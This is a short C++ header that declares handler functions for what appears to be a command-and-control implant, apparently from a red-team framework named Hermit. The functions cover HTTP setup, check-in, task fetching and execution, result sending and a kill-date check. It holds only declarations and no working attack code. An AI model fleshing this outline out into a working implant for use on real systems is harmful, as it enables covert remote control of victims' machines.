#ifndef HERMIT_CORE_HANDLER_HPP
#define HERMIT_CORE_HANDLER_HPP

#include "core/task.hpp"
#include "core/crypt.hpp"
#include "core/json.hpp"
#include "core/parser.hpp"
#include "core/procs.hpp"
#include "core/state.hpp"
#include "core/stdout.hpp"
#include "core/system.hpp"
#include "core/utils.hpp"

using json = nlohmann::json;

namespace Handler
{
	VOID HTTPInit(State::PSTATE pState);
	VOID HTTPClose(State::PSTATE pState);
	std::wstring GetInitialInfoJSON(State::PSTATE pState);
	BOOL CheckIn(State::PSTATE pState, const std::wstring& wInfoJson);
	BOOL TaskGet(State::PSTATE pState);
	BOOL TaskExecute(State::PSTATE pState);
	BOOL TaskResultSend(State::PSTATE pState);
	BOOL Task(State::PSTATE pState);
	// BOOL SocketAccept(State::PSTATE pState);
	// BOOL SocketRead(State::PSTATE pState);
	// BOOL SocketClose(State::PSTATE pState);
	// BOOL SocketKill(State::PSTATE pState);
	// BOOL Socket(State::PSTATE pState);
	BOOL IsKillDateReached(State::PSTATE pState);
}

#endif // HERMIT_CORE_HANDLER_HPP